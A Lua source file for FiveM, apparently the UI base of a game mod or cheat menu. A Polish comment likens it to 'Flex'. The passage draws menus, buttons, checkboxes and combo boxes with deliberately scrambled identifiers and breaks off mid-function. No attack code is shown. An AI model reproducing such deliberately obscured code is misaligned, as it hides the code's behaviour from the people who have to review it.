--v500 TO MENU TAKIE JAK FLEX.
--TYLKO INNE KOLORKI!
APISHITACCCCCCCCCCCCC = {}

APISHITACCCCCCCCCCCCC.APISRAPI = false

local function GREVGHEVHTHVRHR(RGTHTYHTRHWTE)
	local VGERVECCCCCCCC = {}
	local GTRGHRTGCRGTBRH = GetGameTimer() / 1000

	VGERVECCCCCCCC.r = math.floor(math.sin(GTRGHRTGCRGTBRH * RGTHTYHTRHWTE + 0) * 127 + 128)
	VGERVECCCCCCCC.g = math.floor(math.sin(GTRGHRTGCRGTBRH * RGTHTYHTRHWTE + 2) * 127 + 128)
	VGERVECCCCCCCC.b = math.floor(math.sin(GTRGHRTGCRGTBRH * RGTHTYHTRHWTE + 4) * 127 + 128)

	return VGERVECCCCCCCC
end

local VCREGREGVREVTECEW = {}
local ZZZZZZZZZZZZZZZZZZZZZ = {up = 172, TRHJRHYTTKJTUKUY = 173, GTRHRTHRHR = 174, VREHGRTHRTHRTY = 175, GTRGTRHRTHR = 176, GRETHTRHTRHRT = 177}
local GVRGGGGGGGGGGG = 0

local GTRGCTRVVRTBHR = nil
local CGHHVEHTHYJR = nil

local VVETVTHTRHVRTE = 0.23
local VTGXTEREDSHRT = 0.17
local HTRHRTHRHR = 0.05
local GVTGCTGWWANDGFBV = 1.5

local VHETHTEHVTGCEHEH = 0.038
local EXFQWFJWHT = 0
local VRTEGRTHTRHTRJHTR = 0.365
local GTRGRTEHJYTJTYJ = 0.005
local KUYLKIOTUGUIJHHUYG = 0.005

local function XETRGTTEHXETHR(ZXXXXXXXXXXXXXXXXXXXXXXXXZ)
	if APISHITACCCCCCCCCCCCC.APISRAPI then
		Citizen.Trace("[TMmenu] " .. tostring(ZXXXXXXXXXXXXXXXXXXXXXXXXZ))
	end
end

local function GTCHRRTSJHTYJT(HYTKULIUKUILU, GTRGRTHRTHTERD, HYTUJTEYDHTYJ)
	if HYTKULIUKUILU and VCREGREGVREVTECEW[HYTKULIUKUILU] then
		VCREGREGVREVTECEW[HYTKULIUKUILU][GTRGRTHRTHTERD] = HYTUJTEYDHTYJ
		XETRGTTEHXETHR(HYTKULIUKUILU .. " RHRTHYYTRJYYTRJYT GTRGRTHRTHTERD changed: { " .. tostring(GTRGRTHRTHTERD) .. ", " .. tostring(HYTUJTEYDHTYJ) .. " }")
	end
end

local function CGTRVHYRTJHTYJNT(HYTKULIUKUILU)
	if HYTKULIUKUILU and VCREGREGVREVTECEW[HYTKULIUKUILU] then
		return VCREGREGVREVTECEW[HYTKULIUKUILU].BJYTJTBJTYJBTY
	else
		return false
	end
end

local function XCRGTRTYJHRYJYT(HYTKULIUKUILU, BJYTJTBJTYJBTY, FRCHGETHTRHTRJET)
	if HYTKULIUKUILU and VCREGREGVREVTECEW[HYTKULIUKUILU] then
		GTCHRRTSJHTYJT(HYTKULIUKUILU, "BJYTJTBJTYJBTY", BJYTJTBJTYJBTY)

		if not FRCHGETHTRHTRJET and VCREGREGVREVTECEW[HYTKULIUKUILU] then
			GTCHRRTSJHTYJT(HYTKULIUKUILU, "GTRHRTTRRJ", 1)
		end

		if BJYTJTBJTYJBTY then
			if HYTKULIUKUILU ~= CGHHVEHTHYJR and CGTRVHYRTJHTYJNT(CGHHVEHTHYJR) then
				XCRGTRTYJHRYJYT(CGHHVEHTHYJR, false)
			end

			CGHHVEHTHYJR = HYTKULIUKUILU
		end
	end
end

local function GRGCREGGGGGGGGGGGGFFFFFF(ZXXXXXXXXXXXXXXXXXXXXXXXXZ, x, y, GTHCVTVRJRTY, VERTSHRTGJRTJ, RFEVREHBGYTRHYGJYTY, GTRRHTGHJTHY, GTRHTGHJTYTJYUJYU, GTRFHTHRTGRJYR)
	SetTextColour(VERTSHRTGJRTJ.r, VERTSHRTGJRTJ.g, VERTSHRTGJRTJ.b, VERTSHRTGJRTJ.a)
	SetTextFont(GTHCVTVRJRTY)
	SetTextScale(RFEVREHBGYTRHYGJYTY, RFEVREHBGYTRHYGJYTY)

	if GTRHTGHJTYTJYUJYU then
		SetTextDropShadow(2, 2, 0, 0, 0)
	end

	if VCREGREGVREVTECEW[CGHHVEHTHYJR] then
		if GTRRHTGHJTHY then
			SetTextCentre(GTRRHTGHJTHY)
		elseif GTRFHTHRTGRJYR then
			SetTextWrap(VCREGREGVREVTECEW[CGHHVEHTHYJR].x, VCREGREGVREVTECEW[CGHHVEHTHYJR].x + VVETVTHTRHVRTE - GTRGRTEHJYTJTYJ)
			SetTextRightJustify(true)
		end
	end
	SetTextEntry("STRING")
	AddTextComponentString(ZXXXXXXXXXXXXXXXXXXXXXXXXZ)
	DrawText(x, y)
end

local function GTRGCTRHGVHRTJVR(x, y, GREGRHBRVBRTHRTRT, RGHTVTHYYTJTYJ, VERTSHRTGJRTJ)
	DrawRect(x, y, GREGRHBRVBRTHRTRT, RGHTVTHYYTJTYJ, VERTSHRTGJRTJ.r, VERTSHRTGJRTJ.g, VERTSHRTGJRTJ.b, VERTSHRTGJRTJ.a)
end

local function VEHRTHRTHYJT()
	if VCREGREGVREVTECEW[CGHHVEHTHYJR] then
		local x = VCREGREGVREVTECEW[CGHHVEHTHYJR].x + VVETVTHTRHVRTE / 2
		local y = VCREGREGVREVTECEW[CGHHVEHTHYJR].y + VTGXTEREDSHRT / 2

		if VCREGREGVREVTECEW[CGHHVEHTHYJR].VGRERHRFTGYHTHJY then
			DrawSprite(
				VCREGREGVREVTECEW[CGHHVEHTHYJR].VGRERHRFTGYHTHJY.VRTHYJHYTJKTYKT,
				VCREGREGVREVTECEW[CGHHVEHTHYJR].VGRERHRFTGYHTHJY.HYTJNTYHJYT,
				x,
				y,
				VVETVTHTRHVRTE,
				VTGXTEREDSHRT,
				0.,
				255,
				255,
				255,
				255
			)
		else
			GTRGCTRHGVHRTJVR(x, y, VVETVTHTRHVRTE, VTGXTEREDSHRT, VCREGREGVREVTECEW[CGHHVEHTHYJR].RECGTERGETJYHETYTR)
		end

		GRGCREGGGGGGGGGGGGFFFFFF(
			VCREGREGVREVTECEW[CGHHVEHTHYJR].RETHRTGHHTRNTRHTR,
			x,
			y - VTGXTEREDSHRT / 2 + HTRHRTHRHR,
			VCREGREGVREVTECEW[CGHHVEHTHYJR].TGRHBRHRTHT,
			VCREGREGVREVTECEW[CGHHVEHTHYJR].GTRRTGHRYHJRY,
			GVTGCTGWWANDGFBV,
			true
		)
	end
end

local function GTRTHTRHRTHJR()
	if VCREGREGVREVTECEW[CGHHVEHTHYJR] then
		local x = VCREGREGVREVTECEW[CGHHVEHTHYJR].x + VVETVTHTRHVRTE / 2
		local y = VCREGREGVREVTECEW[CGHHVEHTHYJR].y + VTGXTEREDSHRT + VHETHTEHVTGCEHEH / 2

		local GTRGRTHTHTR = {
			r = VCREGREGVREVTECEW[CGHHVEHTHYJR].RECGTERGETJYHETYTR.r,
			g = VCREGREGVREVTECEW[CGHHVEHTHYJR].RECGTERGETJYHETYTR.g,
			b = VCREGREGVREVTECEW[CGHHVEHTHYJR].RECGTERGETJYHETYTR.b,
			a = 255
		}

		GTRGCTRHGVHRTJVR(x, y, VVETVTHTRHVRTE, VHETHTEHVTGCEHEH, VCREGREGVREVTECEW[CGHHVEHTHYJR].GEGTHRHRTYJTYJTYU)
		GRGCREGGGGGGGGGGGGFFFFFF(
			VCREGREGVREVTECEW[CGHHVEHTHYJR].GVTRHRTTRJRT,
			VCREGREGVREVTECEW[CGHHVEHTHYJR].x + GTRGRTEHJYTJTYJ,
			y - VHETHTEHVTGCEHEH / 2 + KUYLKIOTUGUIJHHUYG,
			EXFQWFJWHT,
			GTRGRTHTHTR,
			VRTEGRTHTRHTRJHTR,
			false
		)

		if GVRGGGGGGGGGGG > VCREGREGVREVTECEW[CGHHVEHTHYJR].RTHNBRYJHYJYJT then
			GRGCREGGGGGGGGGGGGFFFFFF(
				tostring(VCREGREGVREVTECEW[CGHHVEHTHYJR].GTRHRTTRRJ) .. " / " .. tostring(GVRGGGGGGGGGGG),
				VCREGREGVREVTECEW[CGHHVEHTHYJR].x + VVETVTHTRHVRTE,
				y - VHETHTEHVTGCEHEH / 2 + KUYLKIOTUGUIJHHUYG,
				EXFQWFJWHT,
				GTRGRTHTHTR,
				VRTEGRTHTRHTRJHTR,
				false,
				false,
				true
			)
		end
	end
end

local function GTRNHRTJNRYKLIU(ZXXXXXXXXXXXXXXXXXXXXXXXXZ, BREBETVEHTRHRHY)
	local x = VCREGREGVREVTECEW[CGHHVEHTHYJR].x + VVETVTHTRHVRTE / 2
	local VREVERHTHYRJHYJR = nil

	if
		VCREGREGVREVTECEW[CGHHVEHTHYJR].GTRHRTTRRJ <= VCREGREGVREVTECEW[CGHHVEHTHYJR].RTHNBRYJHYJYJT and
			GVRGGGGGGGGGGG <= VCREGREGVREVTECEW[CGHHVEHTHYJR].RTHNBRYJHYJYJT
	 then
		VREVERHTHYRJHYJR = GVRGGGGGGGGGGG
	elseif
		GVRGGGGGGGGGGG > VCREGREGVREVTECEW[CGHHVEHTHYJR].GTRHRTTRRJ - VCREGREGVREVTECEW[CGHHVEHTHYJR].RTHNBRYJHYJYJT and
			GVRGGGGGGGGGGG <= VCREGREGVREVTECEW[CGHHVEHTHYJR].GTRHRTTRRJ
	 then
		VREVERHTHYRJHYJR = GVRGGGGGGGGGGG - (VCREGREGVREVTECEW[CGHHVEHTHYJR].GTRHRTTRRJ - VCREGREGVREVTECEW[CGHHVEHTHYJR].RTHNBRYJHYJYJT)
	end

	if VREVERHTHYRJHYJR then
		local y = VCREGREGVREVTECEW[CGHHVEHTHYJR].y + VTGXTEREDSHRT + VHETHTEHVTGCEHEH + (VHETHTEHVTGCEHEH * VREVERHTHYRJHYJR) - VHETHTEHVTGCEHEH / 2
		local VRTGRTHYRJJTY = nil
		local VRHJHTYJYT = nil
		local VRTHTHTJTJR = nil
		local GTRHTGHJTYTJYUJYU = false

		if VCREGREGVREVTECEW[CGHHVEHTHYJR].GTRHRTTRRJ == GVRGGGGGGGGGGG then
			VRTGRTHYRJJTY = VCREGREGVREVTECEW[CGHHVEHTHYJR].HTRHRTYJUKY
			VRHJHTYJYT = VCREGREGVREVTECEW[CGHHVEHTHYJR].VRTHJRTJRKUY
			VRTHTHTJTJR = VCREGREGVREVTECEW[CGHHVEHTHYJR].VRTHJRTJRKUY
		else
			VRTGRTHYRJJTY = VCREGREGVREVTECEW[CGHHVEHTHYJR].BTHTRJYUTKU
			VRHJHTYJYT = VCREGREGVREVTECEW[CGHHVEHTHYJR].HYTHTYRFYHTYHFDR
			VRTHTHTJTJR = VCREGREGVREVTECEW[CGHHVEHTHYJR].GTRHRTJUYKYU
			GTRHTGHJTYTJYUJYU = true
		end

		GTRGCTRHGVHRTJVR(x, y, VVETVTHTRHVRTE, VHETHTEHVTGCEHEH, VRTGRTHYRJJTY)
		GRGCREGGGGGGGGGGGGFFFFFF(
			ZXXXXXXXXXXXXXXXXXXXXXXXXZ,
			VCREGREGVREVTECEW[CGHHVEHTHYJR].x + GTRGRTEHJYTJTYJ,
			y - (VHETHTEHVTGCEHEH / 2) + KUYLKIOTUGUIJHHUYG,
			EXFQWFJWHT,
			VRHJHTYJYT,
			VRTEGRTHTRHTRJHTR,
			false,
			GTRHTGHJTYTJYUJYU
		)

		if BREBETVEHTRHRHY then
			GRGCREGGGGGGGGGGGGFFFFFF(
				BREBETVEHTRHRHY,
				VCREGREGVREVTECEW[CGHHVEHTHYJR].x + GTRGRTEHJYTJTYJ,
				y - VHETHTEHVTGCEHEH / 2 + KUYLKIOTUGUIJHHUYG,
				EXFQWFJWHT,
				VRTHTHTJTJR,
				VRTEGRTHTRHTRJHTR,
				false,
				GTRHTGHJTYTJYUJYU,
				true
			)
		end
	end
end

function APISHITACCCCCCCCCCCCC.GTRHRTHRJY(HYTKULIUKUILU, RETHRTGHHTRNTRHTR)

	VCREGREGVREVTECEW[HYTKULIUKUILU] = {}
	VCREGREGVREVTECEW[HYTKULIUKUILU].RETHRTGHHTRNTRHTR = RETHRTGHHTRNTRHTR
	VCREGREGVREVTECEW[HYTKULIUKUILU].GVTRHRTTRJRT = "INTERACTION MENU"

	VCREGREGVREVTECEW[HYTKULIUKUILU].BJYTJTBJTYJBTY = false

	VCREGREGVREVTECEW[HYTKULIUKUILU].VTRHTRHRHTRJR = nil

	VCREGREGVREVTECEW[HYTKULIUKUILU].HGTRHRTHRTHBGR = false

	VCREGREGVREVTECEW[HYTKULIUKUILU].x = 0.70
	VCREGREGVREVTECEW[HYTKULIUKUILU].y = 0.25

	VCREGREGVREVTECEW[HYTKULIUKUILU].GTRHRTTRRJ = 1
	VCREGREGVREVTECEW[HYTKULIUKUILU].RTHNBRYJHYJYJT = 10
	VCREGREGVREVTECEW[HYTKULIUKUILU].TGRHBRHRTHT = 1
	VCREGREGVREVTECEW[HYTKULIUKUILU].GTRRTGHRYHJRY = {r = 255, g = 0, b = 0, a = 255}
	Citizen.CreateThread(
		function()
			while true do
				Citizen.Wait(0)
				local GTRHRTHGTRRTYJY = GREVGHEVHTHVRHR(1.0)					
				VCREGREGVREVTECEW[HYTKULIUKUILU].RECGTERGETJYHETYTR = {r = 38, g = 38, b = 38, a = 200}
				VCREGREGVREVTECEW[HYTKULIUKUILU].HTRHRTYJUKY = {r = 32, g = 32, b = 32, a = 255}
			end
		end)
	VCREGREGVREVTECEW[HYTKULIUKUILU].VGRERHRFTGYHTHJY = nil

	VCREGREGVREVTECEW[HYTKULIUKUILU].HYTHTYRFYHTYHFDR = {r = 255, g = 255, b = 255, a = 255}
	VCREGREGVREVTECEW[HYTKULIUKUILU].GTRHRTJUYKYU = {r = 255, g = 0, b = 0, a = 255}
	VCREGREGVREVTECEW[HYTKULIUKUILU].VRTHJRTJRKUY = {r = 243, g = 255, b = 69, a = 255}
	--VCREGREGVREVTECEW[HYTKULIUKUILU].HTRHRTYJUKY = { r = 255, g = 56, b = 56, a = 255 }
	VCREGREGVREVTECEW[HYTKULIUKUILU].BTHTRJYUTKU = {r = 0, g = 0, b = 0, a = 100}

	VCREGREGVREVTECEW[HYTKULIUKUILU].GEGTHRHRTYJTYJTYU = {
		r = VCREGREGVREVTECEW[HYTKULIUKUILU].BTHTRJYUTKU.r,
		g = VCREGREGVREVTECEW[HYTKULIUKUILU].BTHTRJYUTKU.g,
		b = VCREGREGVREVTECEW[HYTKULIUKUILU].BTHTRJYUTKU.b,
		a = 50
	}

	VCREGREGVREVTECEW[HYTKULIUKUILU].FREGRTHTRHR = {HYTJNTYHJYT = "SELECT", RTEHTRHTRHRHYR = "HUD_FRONTEND_DEFAULT_SOUNDSET"} 

	XETRGTTEHXETHR(tostring(HYTKULIUKUILU) .. " RHRTHYYTRJYYTRJYT created")
end

function APISHITACCCCCCCCCCCCC.GRTEGTRHRTHGRTY(HYTKULIUKUILU, VETRHTRHRYKJYJ, GVTRHRTTRJRT)
	if VCREGREGVREVTECEW[VETRHTRHRYKJYJ] then
		APISHITACCCCCCCCCCCCC.GTRHRTHRJY(HYTKULIUKUILU, VCREGREGVREVTECEW[VETRHTRHRYKJYJ].RETHRTGHHTRNTRHTR)

		if GVTRHRTTRJRT then
			GTCHRRTSJHTYJT(HYTKULIUKUILU, "GVTRHRTTRJRT", string.upper(GVTRHRTTRJRT))
		else
			GTCHRRTSJHTYJT(HYTKULIUKUILU, "GVTRHRTTRJRT", string.upper(VCREGREGVREVTECEW[VETRHTRHRYKJYJ].GVTRHRTTRJRT))
		end

		GTCHRRTSJHTYJT(HYTKULIUKUILU, "VTRHTRHRHTRJR", VETRHTRHRYKJYJ)

		GTCHRRTSJHTYJT(HYTKULIUKUILU, "x", VCREGREGVREVTECEW[VETRHTRHRYKJYJ].x)
		GTCHRRTSJHTYJT(HYTKULIUKUILU, "y", VCREGREGVREVTECEW[VETRHTRHRYKJYJ].y)
		GTCHRRTSJHTYJT(HYTKULIUKUILU, "RTHNBRYJHYJYJT", VCREGREGVREVTECEW[VETRHTRHRYKJYJ].RTHNBRYJHYJYJT)
		GTCHRRTSJHTYJT(HYTKULIUKUILU, "TGRHBRHRTHT", VCREGREGVREVTECEW[VETRHTRHRYKJYJ].TGRHBRHRTHT)
		GTCHRRTSJHTYJT(HYTKULIUKUILU, "GTRRTGHRYHJRY", VCREGREGVREVTECEW[VETRHTRHRYKJYJ].GTRRTGHRYHJRY)
		GTCHRRTSJHTYJT(HYTKULIUKUILU, "RECGTERGETJYHETYTR", VCREGREGVREVTECEW[VETRHTRHRYKJYJ].RECGTERGETJYHETYTR)
		GTCHRRTSJHTYJT(HYTKULIUKUILU, "VGRERHRFTGYHTHJY", VCREGREGVREVTECEW[VETRHTRHRYKJYJ].VGRERHRFTGYHTHJY)
		GTCHRRTSJHTYJT(HYTKULIUKUILU, "HYTHTYRFYHTYHFDR", VCREGREGVREVTECEW[VETRHTRHRYKJYJ].HYTHTYRFYHTYHFDR)
		GTCHRRTSJHTYJT(HYTKULIUKUILU, "GTRHRTJUYKYU", VCREGREGVREVTECEW[VETRHTRHRYKJYJ].GTRHRTJUYKYU)
		GTCHRRTSJHTYJT(HYTKULIUKUILU, "VRTHJRTJRKUY", VCREGREGVREVTECEW[VETRHTRHRYKJYJ].VRTHJRTJRKUY)
		GTCHRRTSJHTYJT(HYTKULIUKUILU, "HTRHRTYJUKY", VCREGREGVREVTECEW[VETRHTRHRYKJYJ].HTRHRTYJUKY)
		GTCHRRTSJHTYJT(HYTKULIUKUILU, "BTHTRJYUTKU", VCREGREGVREVTECEW[VETRHTRHRYKJYJ].BTHTRJYUTKU)
		GTCHRRTSJHTYJT(HYTKULIUKUILU, "GEGTHRHRTYJTYJTYU", VCREGREGVREVTECEW[VETRHTRHRYKJYJ].GEGTHRHRTYJTYJTYU)
	else
		XETRGTTEHXETHR("Failed to create " .. tostring(HYTKULIUKUILU) .. " submenu: " .. tostring(VETRHTRHRYKJYJ) .. " VETRHTRHRYKJYJ RHRTHYYTRJYYTRJYT doesn'fvregegtrheytjytt exist")
	end
end

function APISHITACCCCCCCCCCCCC.VRHGTRHRHTRY()
	return CGHHVEHTHYJR
end

function APISHITACCCCCCCCCCCCC.BTRRBRTBYTYUJKYU(HYTKULIUKUILU)
	if HYTKULIUKUILU and VCREGREGVREVTECEW[HYTKULIUKUILU] then
		PlaySoundFrontend(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
		XCRGTRTYJHRYJYT(HYTKULIUKUILU, true)

		if VCREGREGVREVTECEW[HYTKULIUKUILU].VGRERHRFTGYHTHJY then
			RequestStreamedTextureDict(VCREGREGVREVTECEW[HYTKULIUKUILU].VGRERHRFTGYHTHJY.VRTHYJHYTJKTYKT, false)
			while not HasStreamedTextureDictLoaded(VCREGREGVREVTECEW[HYTKULIUKUILU].VGRERHRFTGYHTHJY.VRTHYJHYTJKTYKT) do
				Citizen.Wait(0)
			end
		end

		XETRGTTEHXETHR(tostring(HYTKULIUKUILU) .. " RHRTHYYTRJYYTRJYT opened")
	else
		XETRGTTEHXETHR("Failed to open " .. tostring(HYTKULIUKUILU) .. " RHRTHYYTRJYYTRJYT: it doesn'fvregegtrheytjytt exist")
	end
end

function APISHITACCCCCCCCCCCCC.VTHGTRHRJUTJUTY(HYTKULIUKUILU)
	return CGTRVHYRTJHTYJNT(HYTKULIUKUILU)
end

function APISHITACCCCCCCCCCCCC.VRTGRTHRJYT()
	for HYTKULIUKUILU, _ in pairs(VCREGREGVREVTECEW) do
		if CGTRVHYRTJHTYJNT(HYTKULIUKUILU) then
			return true
		end
	end

	return false
end

function APISHITACCCCCCCCCCCCC.TERHJRTJJRTYJ()
	if VCREGREGVREVTECEW[CGHHVEHTHYJR] then
		return VCREGREGVREVTECEW[CGHHVEHTHYJR].HGTRHRTHRTHBGR
	else
		return false
	end
end

function APISHITACCCCCCCCCCCCC.VTRHTRHRTRETHGRD()
	if VCREGREGVREVTECEW[CGHHVEHTHYJR] then
		if VCREGREGVREVTECEW[CGHHVEHTHYJR].HGTRHRTHRTHBGR then
			VCREGREGVREVTECEW[CGHHVEHTHYJR].HGTRHRTHRTHBGR = false
			XCRGTRTYJHRYJYT(CGHHVEHTHYJR, false)
			XETRGTTEHXETHR(tostring(CGHHVEHTHYJR) .. " RHRTHYYTRJYYTRJYT closed")
			PlaySoundFrontend(-1, "QUIT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
			GVRGGGGGGGGGGG = 0
			CGHHVEHTHYJR = nil
			GTRGCTRVVRTBHR = nil
		else
			VCREGREGVREVTECEW[CGHHVEHTHYJR].HGTRHRTHRTHBGR = true
			XETRGTTEHXETHR(tostring(CGHHVEHTHYJR) .. " RHRTHYYTRJYYTRJYT about to be closed")
		end
	end
end

function APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ(ZXXXXXXXXXXXXXXXXXXXXXXXXZ, BREBETVEHTRHRHY)
	local GERGTHRJTREYJTEYTE = ZXXXXXXXXXXXXXXXXXXXXXXXXZ
	if BREBETVEHTRHRHY then
		GERGTHRJTREYJTEYTE = "{ " .. tostring(GERGTHRJTREYJTEYTE) .. ", " .. tostring(BREBETVEHTRHRHY) .. " }"
	end

	if VCREGREGVREVTECEW[CGHHVEHTHYJR] then
		GVRGGGGGGGGGGG = GVRGGGGGGGGGGG + 1

		local VRFGHRTHREDREHJYTYE = VCREGREGVREVTECEW[CGHHVEHTHYJR].GTRHRTTRRJ == GVRGGGGGGGGGGG

		GTRNHRTJNRYKLIU(ZXXXXXXXXXXXXXXXXXXXXXXXXZ, BREBETVEHTRHRHY)

		if VRFGHRTHREDREHJYTYE then
			if GTRGCTRVVRTBHR == ZZZZZZZZZZZZZZZZZZZZZ.GTRGTRHRTHR then
				PlaySoundFrontend(-1, VCREGREGVREVTECEW[CGHHVEHTHYJR].FREGRTHTRHR.HYTJNTYHJYT, VCREGREGVREVTECEW[CGHHVEHTHYJR].FREGRTHTRHR.RTEHTRHTRHRHYR, true)
				XETRGTTEHXETHR(GERGTHRJTREYJTEYTE .. " button pressed")
				return true
			elseif GTRGCTRVVRTBHR == ZZZZZZZZZZZZZZZZZZZZZ.GTRHRTHRHR or GTRGCTRVVRTBHR == ZZZZZZZZZZZZZZZZZZZZZ.VREHGRTHRTHRTY then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
			end
		end

		return false
	else
		XETRGTTEHXETHR("Failed to create " .. GERGTHRJTREYJTEYTE .. " button: " .. tostring(CGHHVEHTHYJR) .. " RHRTHYYTRJYYTRJYT doesn'fvregegtrheytjytt exist")

		return false
	end
end

function APISHITACCCCCCCCCCCCC.VTRYTHYTHYTHJYTHYJRHET(ZXXXXXXXXXXXXXXXXXXXXXXXXZ, HYTKULIUKUILU)
	if VCREGREGVREVTECEW[HYTKULIUKUILU] then
		if APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ(ZXXXXXXXXXXXXXXXXXXXXXXXXZ) then
			XCRGTRTYJHRYJYT(CGHHVEHTHYJR, false)
			XCRGTRTYJHRYJYT(HYTKULIUKUILU, true, true)

			return true
		end
	else
		XETRGTTEHXETHR("Failed to create " .. tostring(ZXXXXXXXXXXXXXXXXXXXXXXXXZ) .. " RHRTHYYTRJYYTRJYT button: " .. tostring(HYTKULIUKUILU) .. " submenu doesn'fvregegtrheytjytt exist")
	end

	return false
end

function APISHITACCCCCCCCCCCCC.VYEVHRHTRYJYTJ(ZXXXXXXXXXXXXXXXXXXXXXXXXZ, GEHTHRTHTRRTYJYRT, TRHRTHYTRJYTYTYTR)
	local TGRHGTRHRTETR = "~r~~h~[ Off ]"
	if GEHTHRTHTRRTYJYRT then
		TGRHGTRHRTETR = "~g~~h~[ On ]"
	end

	if APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ(ZXXXXXXXXXXXXXXXXXXXXXXXXZ, TGRHGTRHRTETR) then
		GEHTHRTHTRRTYJYRT = not GEHTHRTHTRRTYJYRT
		XETRGTTEHXETHR(tostring(ZXXXXXXXXXXXXXXXXXXXXXXXXZ) .. " checkbox changed to " .. tostring(GEHTHRTHTRRTYJYRT))
		TRHRTHYTRJYTYTYTR(GEHTHRTHTRRTYJYRT)

		return true
	end

	return false
end

function APISHITACCCCCCCCCCCCC.GTRHRTHRTHRJYR(ZXXXXXXXXXXXXXXXXXXXXXXXXZ, GRETFHTRHJYJR, HTRHJTRJHRTJRY, selectedIndex_SSIJCHUHJA, TRHRTHYTRJYTYTYTR)
	local HTRHJRTJHYRJYT = #GRETFHTRHJYJR
	local HGTRHTRHRDTREJETY = GRETFHTRHJYJR[HTRHJTRJHRTJRY]
	local VRFGHRTHREDREHJYTYE = VCREGREGVREVTECEW[CGHHVEHTHYJR].GTRHRTTRRJ == (GVRGGGGGGGGGGG + 1)

	if HTRHJRTJHYRJYT > 1 and VRFGHRTHREDREHJYTYE then
		HGTRHTRHRDTREJETY = "← " .. tostring(HGTRHTRHRDTREJETY) .. " →"
	end

	if APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ(ZXXXXXXXXXXXXXXXXXXXXXXXXZ, HGTRHTRHRDTREJETY) then
		selectedIndex_SSIJCHUHJA = HTRHJTRJHRTJRY
		TRHRTHYTRJYTYTYTR(HTRHJTRJHRTJRY, selectedIndex_SSIJCHUHJA)
		return true
	elseif VRFGHRTHREDREHJYTYE then
		if GTRGCTRVVRTBHR == ZZZZZZZZZZZZZZZZZZZZZ.GTRHRTHRHR then
			if HTRHJTRJHRTJRY > 1 then
				HTRHJTRJHRTJRY = HTRHJTRJHRTJRY - 1
			else
				HTRHJTRJHRTJRY = HTRHJRTJHYRJYT
			end
		elseif GTRGCTRVVRTBHR == ZZZZZZZZZZZZZZZZZZZZZ.VREHGRTHRTHRTY then
			if HTRHJTRJHRTJRY < HTRHJRTJHYRJYT then
				HTRHJTRJHRTJRY = HTRHJTRJHRTJRY + 1
			else
				HTRHJTRJHRTJRY = 1
			end
		end
	else
		HTRHJTRJHRTJRY = selectedIndex_SSIJCHUHJA
		
	end

	TRHRTHYTRJYTYTYTR(HTRHJTRJHRTJRY, selectedIndex_SSIJCHUHJA)
	return false
end

function APISHITACCCCCCCCCCCCC.THRHTYHTYRJYTJ()
	if CGTRVHYRTJHTYJNT(CGHHVEHTHYJR) then
		if VCREGREGVREVTECEW[CGHHVEHTHYJR].HGTRHRTHRTHBGR then
			APISHITACCCCCCCCCCCCC.VTRHTRHRTRETHGRD()
		else
			ClearAllHelpMessages()

			VEHRTHRTHYJT()
			GTRTHTRHRTHJR()

			GTRGCTRVVRTBHR = nil

			if IsDisabledControlJustPressed(0, ZZZZZZZZZZZZZZZZZZZZZ.TRHJRHYTTKJTUKUY) then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)

				if VCREGREGVREVTECEW[CGHHVEHTHYJR].GTRHRTTRRJ < GVRGGGGGGGGGGG then
					VCREGREGVREVTECEW[CGHHVEHTHYJR].GTRHRTTRRJ = VCREGREGVREVTECEW[CGHHVEHTHYJR].GTRHRTTRRJ + 1
				else
					VCREGREGVREVTECEW[CGHHVEHTHYJR].GTRHRTTRRJ = 1
				end
			elseif IsDisabledControlJustPressed(0, ZZZZZZZZZZZZZZZZZZZZZ.up) then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)

				if VCREGREGVREVTECEW[CGHHVEHTHYJR].GTRHRTTRRJ > 1 then
					VCREGREGVREVTECEW[CGHHVEHTHYJR].GTRHRTTRRJ = VCREGREGVREVTECEW[CGHHVEHTHYJR].GTRHRTTRRJ - 1
				else
					VCREGREGVREVTECEW[CGHHVEHTHYJR].GTRHRTTRRJ = GVRGGGGGGGGGGG
				end
			elseif IsDisabledControlJustPressed(0, ZZZZZZZZZZZZZZZZZZZZZ.GTRHRTHRHR) then
				GTRGCTRVVRTBHR = ZZZZZZZZZZZZZZZZZZZZZ.GTRHRTHRHR
			elseif IsDisabledControlJustPressed(0, ZZZZZZZZZZZZZZZZZZZZZ.VREHGRTHRTHRTY) then
				GTRGCTRVVRTBHR = ZZZZZZZZZZZZZZZZZZZZZ.VREHGRTHRTHRTY
			elseif IsDisabledControlJustPressed(0, ZZZZZZZZZZZZZZZZZZZZZ.GTRGTRHRTHR) then
				GTRGCTRVVRTBHR = ZZZZZZZZZZZZZZZZZZZZZ.GTRGTRHRTHR
			elseif IsDisabledControlJustPressed(0, ZZZZZZZZZZZZZZZZZZZZZ.GRETHTRHTRHRT) then
				if VCREGREGVREVTECEW[VCREGREGVREVTECEW[CGHHVEHTHYJR].VTRHTRHRHTRJR] then
					PlaySoundFrontend(-1, "BACK", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
					XCRGTRTYJHRYJYT(VCREGREGVREVTECEW[CGHHVEHTHYJR].VTRHTRHRHTRJR, true)
				else
					APISHITACCCCCCCCCCCCC.VTRHTRHRTRETHGRD()
				end
			end

			GVRGGGGGGGGGGG = 0
		end
	end
end

function APISHITACCCCCCCCCCCCC.GTRHRTRJYRJUKY(HYTKULIUKUILU, GREGRHBRVBRTHRTRT)
	GTCHRRTSJHTYJT(HYTKULIUKUILU, "GREGRHBRVBRTHRTRT", GREGRHBRVBRTHRTRT)
end

function APISHITACCCCCCCCCCCCC.REGEGHERHERHTE(HYTKULIUKUILU, x)
	GTCHRRTSJHTYJT(HYTKULIUKUILU, "x", x)
end

function APISHITACCCCCCCCCCCCC.TRHTJHTRJRY(HYTKULIUKUILU, y)
	GTCHRRTSJHTYJT(HYTKULIUKUILU, "y", y)
end

function APISHITACCCCCCCCCCCCC.HTRJHTRJYJUT(HYTKULIUKUILU, GTRHRTJYULKYU)
